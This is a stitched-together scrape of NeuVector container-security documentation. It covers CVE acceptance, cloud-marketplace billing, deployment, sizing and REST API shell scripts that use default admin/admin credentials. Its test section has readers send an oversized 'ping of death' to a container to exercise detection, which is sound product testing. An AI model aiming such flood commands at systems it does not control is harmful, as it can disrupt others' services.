unaffectedGreen = protected by NeuVector with Monitor or Protect modeRed = unprotected by NeuVector, still in Discover mode  The Impact analysis window (showing affected images, nodes, containers) color scheme is:  Black = unaffected. There are no containers using this image in productionPurple = running in Monitor mode in productionDark Green = running in Protect mode in productionLight Blue = running in Discover mode in production (unprotected)  The Impact colors are meant to correspond to the run-time protection colors for Discover, Monitor and Protect modes in other places in the NeuVector console.  Accepting Vulnerabilities​  You can 'Accept' a vulnerability (CVE) to exclude it from reports, views, risk scoring etc. A vulnerability can be selected and the Accept button clicked from several screens such as Security Risks -&gt; Vulnerabilities, Assets -&gt; Containers etc. Once accepted, it is added to the Security Risks -&gt; Vulnerability Profile list. It can be viewed, exported, and edited here. Note that this Accept feature can be limited to listed Images and/or Namespaces. New entries can also be added manually to this list from this screen.  To Accept a vulnerability globally, go to the Security Risks -&gt; Vulnerabilities page and select the vulnerability, then Accept. This will create a Vulnerability Profile for this CVE globally.    To Accept a vulnerability found in an image scan, open the image scan results in Assets -&gt; Registries, pull down the View dropdown and select Accept. Note that you can also choose to Show or Hide accepted vulnerabilities for this image. NOTE: This action will create a Vulnerability Profile entry for this CVE in this IMAGE only.    To Accept a vulnerability found in a container in Assets -&gt; Containers, select the vulnerability and pull down the View dropdown and select Accept. Note that you can also choose to Show or Hide accepted vulnerabilities for this container. NOTE: This action will create a Vulnerability Profile for this CVE in this NAMESPACE only.    This action can also be performed in Assets -&gt; Nodes, which will create a Vulnerability Profile for the CVE for all containers, images and namespaces.  important Globally Accepted vulnerabilities are excluded from the view in Security Risks -&gt; Vulnerabilities and in exported reports from this page. Accepted vulnerabilities which are limited to specific images or namespaces will continue to show in the view, but be excluded for reports where the Advanced Filter limits the view to those images or namespaces.  Managing Vulnerability Profiles​  Each accepted vulnerability/CVE creates an entry in the Security Risks -&gt; Vulnerability Profile list. These entries can be edited to add or remove attributes such as image name(s) and namespace(s).    New accepted vulnerabilities can also be added here by entering the CVE name to be Accepted.

To update the CVE database used in scanning, simply pull and deploy the latest Scanner image. The latest database version number can be found listed here.  A container called the Updater performs the task of restarting the scanner pods in order to force a pull of the latest image, which will update the CVE database. To automatically check for updates and update the scanner, an updater cron job can be created.  By default, the updater cron job shown below is automatically started from the sample deployment yaml files for Kubernetes and OpenShift. This will automatically check for new CVE database updates through new scanner versions published on the NeuVector Docker hub registry. Manual updates on docker native deployments are shown below. For OpenShift deployments or others where images have to be manually pulled from NeuVector, the scanner with the 'latest' tag should be pulled from NeuVector to update the CVE database.

","version":"Next 🚧","tagName":"h2"},{"title":"Billing​","type":1,"pageTitle":"Public Cloud Marketplaces","url":"/next/special/public-cloud#billing","content":" I have an existing NeuVector subscription; can I use this on the public cloud?  BYOS (Bring Your Own Subscription) NeuVector Prime deployments are supported on the public cloud, but billing would be through your normal software purchase channels and not through the cloud provider marketplace. Once the existing subscription term ends, you can purchase NeuVector Prime via the cloud marketplace and reconfigure your cluster to support monthly billing through the cloud provider.  I have an existing deployment covered by a NeuVector subscription; can I use this new listing in the cloud marketplace for new deployments?  Yes, the marketplace listing works independently from your existing NeuVector Prime subscriptions. Please remember that support processes may be different for deployments using your existing subscription and those billed via the cloud Marketplace.  Tell me more about how the billing for NeuVector Prime works via the cloud?  When purchasing NeuVector Prime through the cloud provider marketplace, the billing is as follows:  Billing is monthly and handled via the cloud provider marketplace. Nodes are counted hourly when NeuVector is active and added to a usage total. An average node count is calculated for the month. There is a monthly usage charge for each node in the average node count. The monthly usage charge depends on the number of nodes in use.  Nodes count There is a 5-node minimum, if the average node count is less than 5 nodes, the charge will be for 5 nodes.  What are the pricing tiers?  NeuVector Prime has different pricing tiers when purchasing via the cloud marketplace. This is based on the number of nodes on which NeuVector is deployed. Details of the tiers are below, please check the listing for further pricing information.  Table 1. Pricing tiers  Tier\tNodes (from)\tNodes (to)1\t5\t15 2\t16\t50 3\t51\t100 4\t101\t250 5\t251\t1000 6\t1000\t15  Is there a way to try NeuVector Prime before purchasing?  If using the NeuVector Prime listing in the cloud provider marketplace, billing commences from the time of deployment. NeuVector can also be deployed manually using the standard documentation and repositories. When ready to add support to your NeuVector deployment and have this billed via the cloud marketplace, follow the available documentation.  How does SUSE calculate the ‘average number of nodes’ to bill for?  The average node count is calculated by adding the number of active nodes (counted hourly) and dividing by the number of hours NeuVector has been active in the billing cycle.  Below are 3 examples of how the average node count is calculated.  note The example uses 730 hours for the billing cycle. Actual billing would depend on the number of days in the month and the resulting billing cycle.  Table 2. Usage calculations for different scenarios  \tHours Active\tNodes\tUsage Total\tAverage Node count\tNode billedStatic Usage\t730\t10\t7300\t10\t10 @Tier 1 Bursting Model\t730\t10 (562 Hours) &amp; 20 (168 Hours)\t10660\t15\t15 @Tier 1 (Rounded from 14.6) Transient Cluster\t336\t20\t6720\t20\t20 @Tier 2  Definitions Static usage: Using NeuVector on 10 nodes, for 1 month (730 hours) with no additional nodes added in the month. Bursting Model: Using NeuVector on 10 nodes for 3 weeks (562 hours) in the month, bursting to 30 nodes for 1 week (168 hours). Transient cluster: A temporary deployment of NeuVector on 20 nodes for 2 weeks (336 hours).  Are special commercial terms available?  Depending on the deployment, it may be possible to secure special commercial terms. e.g. An annual subscription would be handled via an AWS private offer. Please contact SUSE for more information.  Can my spend on NeuVector Prime count towards my cloud discount program such as AWS EDP or Azure’s MACC?  For AWS, the spend can count towards your EDP. Please contact your AWS Sales Team for more details. For Azure, the spend can count towards your MACC. Please contact your Microsoft Azure Sales Team for more details.  How do I purchase NeuVector Prime for additional nodes?  Once NeuVector has been deployed from the listing on the cloud marketplace and billing is active, there is no need to make a specific purchase for additional nodes. Billing is dynamic and based on the number of nodes where NeuVector is deployed. Just add NeuVector to additional nodes in federated clusters as needed.  Is this an annual commitment, will it auto-renew?  By default, the NeuVector Prime listing in the cloud provider marketplace is billed on a monthly cycle, based on usage. Billing is on-going for as long as NeuVector is deployed.  Depending on the deployment, custom monthly pricing may be available. This applies to AWS and Azure deployments.  ","version":"Next 🚧","tagName":"h2"},{"title":"Technical (Billing)​","type":1,"pageTitle":"Public Cloud Marketplaces","url":"/next/special/public-cloud#technical-billing","content":" Do I need a managed Kubernetes cluster running in my cloud provide to install NeuVector Prime and be billed via the marketplace?  Yes. For AWS, to benefit from monthly billing via the AWS Marketplace, the primary cluster must be an EKS Cluster running in your AWS Account. For Azure, to benefit from monthly billing via the Azure Marketplace, the primary cluster must be an AKS Cluster running in your Azure Account.  On which Kubernetes distributions can the NeuVector Prime Cloud Marketplace listing be deployed?  For AWS, the NeuVector Prime AWS Marketplace listing must be deployed on an Amazon EKS. For Azure, the NeuVector Prime Azure Marketplace listing must be deployed on AKS via the marketplace offering.  info Downstream clusters can run any Supported Kubernetes platform, such as RKE, RKE2, K3s, AKS, EKS, GKE, vanilla Kubernetes, OpenShift, Mirantis Kubernetes Engine, and so on. Please see Supported Platforms.  What is the deployment mechanism?  For AWS, the Marketplace listing for NeuVector Prime is deployed using Helm. For Azure, the NeuVector Prime Azure Marketplace listing is deployed using the Azure Portal (and the deployment is CNAB based).  What is the easiest way to get started?  The way to get started is to add the cloud marketplace listing for NeuVector Prime to a managed cubernetes cluster, such as as EKS or AKS. Follow the instructions in the usage section, a Helm chart in AWS and the Azure Portal for Azure, takes care of the application installation and setting up billing.  What version of NeuVector is installed when using the marketplace listing?  The marketplace listing for NeuVector Prime is tied to a specific version of NeuVector, typically the latest version available at the time of the listing update. Please check the listing for further information.  I need a prior version of NeuVector installed, can I still use the listing?  No. There is no choice of NeuVector version when deploying using the marketplace listing. If a prior version of NeuVector is required, must be installed manually using the standard documentation.  How often is the listing updated (including the version of NeuVector)?  The marketplace listing is tied to a specific version of NeuVector, usually the latest version available at the time the listing was last updated.  Typically, the marketplace listing is updated quarterly, or more frequently if there are security issues. NeuVector itself is updated with major, minor, or patch versions every 6-8 weeks.  To update the NeuVector product to a current version before the marketplace listing is updated, please see Updating NeuVector.  I have many Kubernetes clusters across multiple cloud accounts, does the NeuVector billing still work and enable tiered pricing?  Yes. Downstream (federated) clusters running NeuVector can be deployed across single or multiple cloud accounts, on-premises or even across diffferent public clouds. Downstream nodes report up to the primary NeuVector deployment. This process is called federation and is needed to enable tiered pricing for your NeuVector deployments.  Billing is routed to the cloud provider account in which the primary cluster is running.  I have multiple independent clusters, each running a separate installation of the NeuVector Prime marketplace listing, how is this billed?  As the NeuVector deployments are independent, each cluster is billed separately from the others. It is not possible to benefit from tiered pricing across clusters unless the NeuVector deployments are federated. Federation requires that only the primary cluster (not downstream remotes) be installed with the NeuVector Prime marketplace listing. Learn more about federation in Enterprise Multi-Cluster Management.  If Federation is not possible, consider custom terms from SUSE.  How can I federate NeuVector to benefit from tiered pricing across all deployments?  The primary cluster must be running on a managed kubernetes cluster. This is EKS in the AWS Cloud, or AKS in Azure. The cluster must be running the NeuVector Prime marketplace listing.  attention There MUST be network connectivity between the controllers in each cluster on the required ports. The controller is exposed externally to its cluster by either a primary or remote service. See Enterprise Multi-Cluster Management for more information on federating clusters.  I have purchased multiple SUSE products from the public cloud marketplace (e.g., Rancher Prime and NeuVector Prime), does the marketplace billing method still work?  Yes. The billing mechanisms for the two deployments are independent and will be billed separately via the marketplace.  I already have an existing cluster in place and want to add NeuVector Prime and have this billed via the marketplace. Is this possible?  Yes, providing it is an EKS cluster in AWS, or AKS in Azure. Simply deploy the AWS Marketplace listing for NeuVector Prime to your EKS or AKS cluster.  I already have an existing cluster with NeuVector deployed, can I just install the NeuVector Prime marketplace listing and have support billed via the cloud marketplace?  Yes. This is possible by redeploying the NeuVector Prime from the cloud provider marketplace listing. Please follow the documentation to back up the existing NeuVector configuration, as it may be necessary to restore the configuration into the new deployment.  ","version":"Next 🚧","tagName":"h2"},{"title":"Technical (Product)​","type":1,"pageTitle":"Public Cloud Marketplaces","url":"/next/special/public-cloud#technical-product","content":" How do I get support?  It is very simple to open a support case with SUSE for NeuVector. Create a ‘supportconfig’ via the NewVector UI and upload the output to the SUSE Customer Center. The support config bundle can be exported from the NeuVector console under Settings &gt; Configuration.  tip For multi-cluster (federated) deployments, export the supportconfig bundle from the primary cluster only. The NeuVector Prime billing mechanism must be active on the primary cluster to open a support case.  Is there any difference between the NeuVector Prime product on the cloud marketplace compared to the versions I can run in my own data center or install manually in the cloud?  The NeuVector Prime product in the cloud marketplace is the same product with the same functionality as what you would install manually in the cloud or run on-premises. The only difference is the billing route.  Does the primary cluster (responsible for billing) need to run 24/7?  To ensure continuity with support, it is recommended that the primary NeuVector Prime cluster always remains active.  What if the primary cluster responsible for billing is unable to connect to the cloud provider billing framework?  There may be multiple reasons why the primary cluster is unable to connect to the billing framework, but it is the customer’s responsibility to ensure that the primary cluster is active and connected. While the cluster is not connected to the billing framework, it is not possible to raise a support request.  My primary cluster has been offline, what happens with billing when it reconnects?  If the primary cluster is offline or disconnected from the cloud provider billing framework for a period of time, when it reconnects, the stored usage data will be uploaded and will appear on your next marketplace bill.  note Depending on when in the month the primary cluster gets reconnected you may have several months of usage on your next billing cycle.

Process and File Protection Tests​  Try various process and file activity by exec'ing into a container and running commands such as apt-get update, ssh, scp or others. Any process activity or file access not allowed will generate alerts in Notifications.  Registry Scanning and Admission Control​  A popular test is to configure image scanning of a registry in Assets -&gt; Registries. After the scan is complete, configure an Admission Control rule in Policy. Be sure to enable Admission Controls and set a rule to Deny when there are high vulnerabilities in an image. Then pick an image that has high vulnerabilities and try to deploy it in Kubernetes. The deployment will be blocked in Protect mode and you will see an event in Notifications -&gt; Security Risks.  More advanced admission control testing can be done using different criteria in rules, or combining criteria.

NeuVector Test Plan  If the link above does not work, you can download it from our website using password nv1851blvd.  NeuVector can also detect threats to your containers such as DDOS attacks. If you run a tool to generate such attacks on your containers, these results will show in Network Activity and in the Dashboard.  For example, a simple ping command with high payload will show the Ping.Death attack in the console. To try this, do the following to the IP address of one of the containers (internal IP of the container).  ping &lt;container_ip&gt; -s 40000   In Kubernetes you can do this from any node including the master. In other environments you may need to be logged into the node where the container is running.

Please be sure to review the online documentation for each step necessary during deployment. Often deployments are attempted by just copying the sample yaml files and deploying them without reviewing the steps prior, such as properly configuring registries, secrets, or RBACs/rolebindings.  Initial Deployment​  Check that the NeuVector containers can be pulled with correct authentication. Check the secret used and make sure the cluster is able to access the appropriate registry.Make sure the changes to the yaml required (e.g. NodePort or LoadBalancer) or Helm values settings are set appropriately.Check the platform and container run-time and make changes as needed (e.g. PKS, containerd, CRI-O).  Login and Initial Configuration​  Check to make sure appropriate access to the manager (IP address, port, route) is allowed through firewalls.  Ongoing Operation​  Directory integration. NeuVector supports specific configurations for LDAP/AD and other integrations for groups and roles. Contact NeuVector for additional troubleshooting steps and a tool for AD troubleshooting.Registry scanning. Most issues are related to registry authentication errors or inability for the controller to access the registry from the cluster.For performance issues, make sure the scanner is allocated enough memory for scanning large images. Also, CPU and memory minimums can be specified in the pod policy to ensure adequate performance at scale.Admission Control. See the Troubleshooting section in the section Security Risks... -&gt; Admission Controls.  Updating​  Use rolling updates for the controller. If you are rebooting hosts, make sure to monitor the controllers as they move to other hosts, or redeploy on the rebooted hosts, to make sure they are able to start, join the controller cluster, and stabilize/sync. Rebooting all hosts at once or too quickly can result in unknown states for the controllers.Use a persistent volume claim to store the NeuVector configuration for the case that all controllers/nodes go down in the cluster.When updating to a new version, review the online documentation to identify changes/additions to the yaml required, as well as other changes such as rolebindings or new services (e.g. admission control webhook, persistent volume claim etc).

If there is a new release available, pull it from Docker Hub. It is recommended to use a ‘rolling update’ strategy to keep at least one Allinone or Controller container running at any time during an update.  imporant Host OS updates, reboots, and orchestrator updates can cause pods to be evicted or stopped. If a Controller is affected, and there are no other Controllers active to maintain the state, the Controllers can become available for some time while new controllers are started, a cluster is formed with a leader, and the persistent storage backup of the configuration is attempted to be accessed to restore the cluster. Be careful when scheduling host or orchestrator updates and reboots which may affect the number of controllers available at any time. See the Pod Disruption Budget below for possible ways to mitigate this. If deployment was done using the NeuVector Helm charts, updating will take care of additional services, rolebindings or other upgrade requirements. If updates are done manually or there is only one Allinone or Controller running, please note that current network connection data is NOT stored and will be lost when the NeuVector container is stopped. NeuVector supports persistent data for the NeuVector policy and configuration. This configures a real-time backup to mount a volume at /var/neuvector/. The primary use case is when the persistent volume is mounted, the configuration and policy are stored during run-time to the persistent volume. In the case of total failure of the cluster, the configuration is automatically restored when the new cluster is created. Configuration and policy can also be manually restored or removed from the /var/neuvector/ volume.  important If a persistent volume is not mounted, NeuVector does NOT store the configuration or policy as persistent data. Be sure to backup the Controller configuration and policy before stopping the allinone or controller container. This can be done in Settings -&gt; Configuration. Alternatively, the controller can be deployed in an HA configuration with 3 or 5 controllers running, in which case the policy will persist with other controllers while one is being updated.  To manually update NeuVector using docker-compose:  sudo docker-compose -f &lt;filename&gt; down   Note that if no filename is specified then the docker-compose.yml file is used.  Make sure the docker-compose.yml or other appropriate file is edited with the desired image version, if necessary, then:  $sudo docker-compose -f &lt;filename&gt; up -d   note We recommend that all NeuVector components be updated to the most recent version at the same time.

Each type of NeuVector container has a unique purpose and may require special performance or node selection requirements for optimum operation.  The NeuVector open source images are hosted on Docker Hub at /neuvector/{image name}.  See the Onboarding/Best Practices section to download an on boarding guide.  Deploy using Kubernetes, OpenShift, Rancher, or other Kubernetes-based tools​  To deploy NeuVector using Kubernetes, OpenShift, Rancher or other orchestration tools, see the preparation steps and sample files in the section Deploying NeuVector. This deploys manager, controller, scanner, and enforcer containers. For simple testing using the NeuVector Allinone container, see the section Special Use Cases with Allinone.  NeuVector supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm.  Automated deployments are supported using Helm, Red Hat/Community Operators, the rest API, or a Kubernetes ConfigMap. See the section Deploy Using ConfigMap for more details on automating deployment.  Deploy using Docker Native​  Before you deploy NeuVector with docker run or compose, you MUST set the CLUSTER_JOIN_ADDR to the appropriate IP address. Find the node IP address, node name (if using a name server, or node variable (if using orchestration tools) for the allinone (controller) to use for the “node IP” in the docker-compose files for both allinone and enforcer. For example:  - CLUSTER_JOIN_ADDR=192.168.33.10   For Swarm-Based deployments, also add the following environment variable:  - NV_PLATFORM_INFO=platform=Docker   See the section Deploying NeuVector -&gt; Docker Production Deployment for instructions and examples.  Backing Up Configuration Files​  By default NeuVector stores various config files in /var/neuvector/config/backup on the Controller or Allinone node.  This volume can be mapped to persistent storage to maintain configuration. Files in the folder may need to be deleted in order to start fresh.  Volume Mapping​  Make sure volumes are mapped properly. NeuVector requires these to operate (/var/neuvector is only required on controller/allinone). For example:  volumes: - /lib/modules:/lib/modules:ro - /var/neuvector:/var/neuvector - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro   Also, you may need to ensure that other tools are not blocking access to the docker.sock interface.  Ports and Port Mapping​  Make sure the required ports are mapped properly and open on the host. The Manager or Allinone requires 8443 (if using the console). The Allinone and Controller requires 18300, 18301, 18400, 18401 and optionally 10443, 11443, 20443, 30443. The Enforcer requires 18301 and 18401.  Note: If deploying docker native (including SWARM) make sure there is not any host firewall blocking access to required ports such as firewalld. If enabled, the docker0 interface must be added as a trusted zone for the allinone/controller hosts.  Port Summary​  The following table lists communications from each NeuVector container. The Allinone container combines the Manager, Controller and Enforcer containers so requires the ports listed for those containers.    The following table summarizes the listening ports for each NeuVector container.    Additional Ports​  In version 5.1, a new listener port has been added on 8181 in the controller for local controller communication only.  tcp 0 0 :::8181 :::* LISTEN 8/opa  ","version":"5.3","tagName":"h3"},{"title":"System Requirements","type":0,"sectionRef":"#","url":"/basics/requirements","content":"System Requirements System Requirements​ Component\t# of Instances\tRecommended vCPU\tMinimum Memory\tNotesController\tmin. 1 3 for HA (odd # only)\t1\t1GB\tvCPU core may be shared Enforcer\t1 per node/VM\t1+\t1GB\tOne or more dedicated vCPU for higher network throughput in Protect mode Scanner\tmin. 1 2+ for HA/Performance\t1\t1GB\tCPU core may be shared for standard workloads.

In Protect mode (inline firewall), the Enforcer requires CPU and memory to filter connections with deep packet inspection and hold them to determine whether they should be blocked/dropped. Generally, with 1GB of memory and a shared CPU, the Enforcer should be able to handle most environments while in Protect mode. For throughput or latency sensitive environments, additional memory and/or a dedicated CPU core can be allocated to the NeuVector Enforcer container. For performance tuning of the Controller and Scanner for registry scanning, see System Requirements above. For additional advice on performance and sizing, see the Onboarding/Best Practices section. Throughput​ As the chart below shows, basic throughput benchmark tests showed a maximum throughput of 1.3 Gbps PER NODE on a small public cloud instance with 4 CPU cores. For example, a 10 node cluster would then be able to handle a maximum of 13 Gbps of throughput for the entire cluster for services in Protect mode. This throughput would be projected to scale up as dedicated a CPU is assigned to the Enforcer, or the CPU speed changes, and/or additional memory is allocated. Again, the scaling will be dependent on the type of network/application traffic of the workloads. Latency​ Latency is another performance metric which depends on the type of network connections. Similar to throughput, latency is not affected in Monitor mode, only for services in Protect (inline firewall) mode. Small packets or simple/fast services will generate a higher latency by NeuVector as a percentage, while larger packets or services requiring complex processing will show a lower percentage of added latency by the NeuVector enforcer. The table below shows the average latency of 2-10% benchmarked using the Redis benchmark tool. The Redis Benchmark uses fairly small packets, so the the latency with larger packets would expected to be lower.

The main way to lower the actual latency (microseconds) in Protect mode is to run on a system with a faster CPU.

A special container called the Allinone is also provided to combine the Controller, Enforcer, and Manager functions all in one container, primarily for docker native deployments.  NeuVector can be deployed on virtual machines or on bare metal systems with a single os.  Controller​  The Controller manages the NeuVector Enforcer container cluster. It also provides REST APIs for the management console. Although typical test deployments have one Controller, multiple Controllers in a high-availability configuration is recommended. 3 controllers is the default in the Kubernetes Production deployment sample yaml.  Enforcer​  The Enforcer is a lightweight container that enforces the security policies. One enforcer should be deployed on each node (host), e.g. as a Daemon set.  note For Docker native (non Kubernetes) deployments the Enforcer container and the Controller cannot be deployed on the same node (except in the All-in-One case below).  Manager​  The Manager is a stateless container that provides a web-UI (HTTPS only) console for users to manage the NeuVector security solution. More than one Manager container can be deployed as necessary.  All-in-One​  The All-in-One container includes a Controller, an Enforcer and a Manager in one package. It's useful for easy installation in single-node or small-scale deployments.  Scanner​  The Scanner is a container which performs the vulnerability and compliance scanning for images, containers and nodes. It is typically deployed as a replicaset and can be scaled up to as many parallel scanners as desired in order to increase the scanning performance. The Controller assigns scanning jobs to each available scanner in a round-robin fashion until all scans are completed. The scanner also contains the latest CVE database and is updated regularly by NeuVector.  Updater​  The Updater is a container which when run, updates the CVE database for NeuVector. NeuVector regularly publishes new scanner images to include the latest CVE for vulnerability scans. The updater re-deploys all scanner pods by taking the deployment to zero and scaling it back up, forcing a pull of an updated scanner image.  Architecture​  Here is a general architecture overview of NeuVector. Not shown is the separate scanner container, which can also be run as a stand-alone pipeline scanner.  ","version":"5.3","tagName":"h3"},{"title":"Deployment Examples​","type":1,"pageTitle":"5.x Overview","url":"/basics/overview#deployment-examples","content":" For common deployment patterns and best practices see the Onboarding/Best Practices section.  All-in-One and Enforcers​  This deployment is ideal for single-node or small-scale environments, for example for evaluation, testing, and small deployments. An All-in-One container is deployed on one node, which can also be a node with running application containers. An Enforcer can be deployed on all other nodes, with one Enforcer required on each node you wish to protect with NeuVector. This is also useful for native Docker deployments where a controller and enforcer cannot run on the same host.  Controller, Manager and Enforcer Containers​  This is a more generic deployment use case which consists one or more Controllers, one Manager and a set of Enforcers. The Controller and Manager can be deployed on the same node or on different nodes than the Enforcer.  All-in-One Only​  You can deploy just the allinone container for registry scanning, using the Jenkins plug-in, or simple one node testing of NeuVector.  Controller Only​  It is possible to deploy a single Controller container and/or scanner to manage vulnerability scanning outside a cluster, for example for use with the Jenkins plug-in. Registry scanning can also be performed by the Controller using the REST API exclusively, but typically a Manager container is also desired in order to provide console based configuration and results viewing for registry scanning.

The REST API documentation is below in a yaml file which is best viewed in a reader such as swagger.io.  Latest update can be found here. Also in the NeuVector GitHub source code repo. The apis.yaml from the main truck can include unreleased features. It is recommended to download the appropriate released version source code and extract the apis.yaml from the controller/api folder.  important If you are making REST API calls with username/password, please be sure make a DELETE call against /v1/auth when done. There is a maximum of 32 concurrent sessions for each user. If this is exceeded, an authentication failure will occur.  NeuVector also support Response Rules to automate common responses to security events or vulnerabilities detected. Please see the section Security Policy -&gt; Response Rules for more details.  Expose REST API in Kubernetes​  To expose the REST API for access from outside of the Kubernetes cluster, enable port 10443.  apiVersion: v1 kind: Service metadata: name: neuvector-svc-controller-api namespace: neuvector spec: ports: - port: 10443 name: controller-api protocol: TCP type: LoadBalancer selector: app: neuvector-controller-pod   note type: NodePort can also be used instead of LoadBalancer.  note If using type LoadBalancer, set the controllerIP in the examples below to the external IP or URL for the loadbalancer.  Authentication for REST API​  The REST API supports two types of authentication: username/password and token. Both can be configured in Settings -&gt; Users, API Keys &amp; Roles, and be associated with default or custom roles to limit access privileges. The examples below show username/password based authentication where a token is created first, then used in subsequent REST API calls. If using a token, it can be used directly in each REST API call. Note: username based connections have a limited number of concurrent sessions, so it is important to delete the username token as shown below when finished. Token based authentication does not have a limit, but expire according to the time limit selected when created.  For token-based authentication, see the following screen shots and example call. Be sure to copy the secret and token once created, as there is no way to retrieve this after the screen in closed.        Trigger Vulnerability Scanning from a script​  NeuVector can be triggered automatically to scan an image for vulnerabilities. This can be done by configuring a registry/repository to be monitored, using the NeuVector Jenkins plug-in, or using the REST API. Please see the section on Scanning &amp; Compliance for more detail.  The sample script below shows how to remotely pull the container, run it, and scan it. It can be triggered from a Jenkins task (remote shell) or any CI/CD tool. A JSON parser tool (jq) is also used.  Be sure to enter the controller IP address in the script and change the container image name to the one you wish to scan. Also, update the username/password fields.  _curCase_=`echo $0 | awk -F&quot;.&quot; '{print $(NF-1)}' | awk -F&quot;/&quot; '{print $NF}'` _DESC_=&quot;able to scan ubuntu:16.04 image&quot; _ERRCODE_=0 _ERRTYPE_=1 _RESULT_=&quot;pass&quot; # please remember to specify the controller ip address here _controllerIP_=&quot;&lt;your_controller_ip&gt;&quot; _controllerRESTAPIPort_=&quot;10443&quot; _neuvectorUsername_=&quot;admin&quot; _neuvectorPassword_=&quot;admin&quot; _registryURL_=&quot;&quot; _registryUsername_=&quot;&quot; _registryPassword_=&quot;&quot; _repository_=&quot;alpine&quot; _tag_=&quot;latest&quot; curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;'$_neuvectorUsername_'&quot;, &quot;password&quot;: &quot;'$_neuvectorPassword_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; token.json _TOKEN_=`cat token.json | jq -r '.token.token'` echo `date +%Y%m%d_%H%M%S` scanning an image ... curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;'$_registryURL_'&quot;, &quot;username&quot;: &quot;'$_registryUsername_'&quot;, &quot;password&quot;: &quot;'$_registryPassword_'&quot;, &quot;repository&quot;: &quot;'$_repository_'&quot;, &quot;tag&quot;: &quot;'$_tag_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/scan/repository&quot; &gt; /dev/null 2&gt;&amp;1 &gt; scan_repository.json while [ `wc -c &lt; scan_repository.json` = &quot;0&quot; ]; do echo `date +%Y%m%d_%H%M%S` scanning is still in progress ... sleep 5 curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;'$_registryURL_'&quot;, &quot;username&quot;: &quot;'$_registryUsername_'&quot;, &quot;password&quot;: &quot;'$_registryPassword_'&quot;, &quot;repository&quot;: &quot;'$_repository_'&quot;, &quot;tag&quot;: &quot;'$_tag_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/scan/repository&quot; &gt; /dev/null 2&gt;&amp;1 &gt; scan_repository.json done echo `date +%Y%m%d_%H%M%S` log out curl -k -X 'DELETE' -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 cat scan_repository.json | jq . rm *.json echo `date +%Y%m%d_%H%M%S` [$_curCase_] $_DESC_: $_RESULT_-$_ERRCODE_   note You may need to install jq sudo yum install jq   For Kubernetes based deployments you can set the Controller IP as follows:  _podNAME_=`kubectl get pod -n neuvector -o wide | grep &quot;allinone\\|controller&quot; | head -n 1 | awk '{print $1}'` _controllerIP_=`kubectl exec $_podNAME_ -n neuvector -- consul info | grep leader_addr | awk -F&quot;:| &quot; '{print $3}'`   note In a multiple controller deployment the requests must be sent to a single controller IP so multiple requests for status of long running image scans go to the controller performing the scan.

The following sample creates a new Group based on the container label nv-service-type=data, and another Group for label nv-service-type=website. A rule is then created to allow traffic from the wordpress container to the mysql container using only the mysql protocol.  Be sure to update the username and password for access to the controller.  #!/bin/sh TOKEN_JSON=$(curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/auth&quot;) _TOKEN_=`echo $TOKEN_JSON | jq -r '.token.token'` curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;name&quot;: &quot;mydb&quot;, &quot;criteria&quot;: [{&quot;value&quot;: &quot;data&quot;, &quot;key&quot;: &quot;nv.service.type&quot;, &quot;op&quot;: &quot;=&quot;}]}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/group&quot; curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;name&quot;: &quot;mywp&quot;, &quot;criteria&quot;: [{&quot;value&quot;: &quot;website&quot;, &quot;key&quot;: &quot;nv.service.type&quot;, &quot;op&quot;: &quot;=&quot;}]}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/group&quot; curl -k -X &quot;PATCH&quot; -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;insert&quot;: {&quot;rules&quot;: [{&quot;comment&quot;: &quot;Custom WP Rule&quot;, &quot;from&quot;: &quot;mywp&quot;, &quot;applications&quot;: [&quot;MYSQL&quot;], &quot;ports&quot;: &quot;any&quot;, &quot;to&quot;: &quot;mydb&quot;, &quot;action&quot;: &quot;allow&quot;, &quot;id&quot;: 0}], &quot;after&quot;: 0}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/policy/rule&quot; curl -k -X &quot;DELETE&quot; -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/auth&quot;   If the Groups already exist in NeuVector then the new rule can be created, skipping the Group creation steps. This example also removes the authentication token at the end. Note that a Rule ID number can be specified and NeuVector executes rules in numerical order lowest to highest.  Export/Import Configuration File​  Here are samples to backup the NeuVector configuration file automatically. You can select whether to export all configuration settings (policy, users, Settings etc), or only the policy.  important These samples are provided as examples only and are not officially supported unless a specific enterprise support agreement has been put in place.  To export all configuration:  ./config.py export -u admin -w admin -s $_controllerIP_ -p $_controllerPort_ -f $_FILENAME_ # exporting the configuration with all settings   To export policy only:  ./config.py export -u admin -w admin -s $_controllerIP_ -p $_controllerPort_ -f $_FILENAME_ --section policy # exporting the configuration with policy only   To import the file:  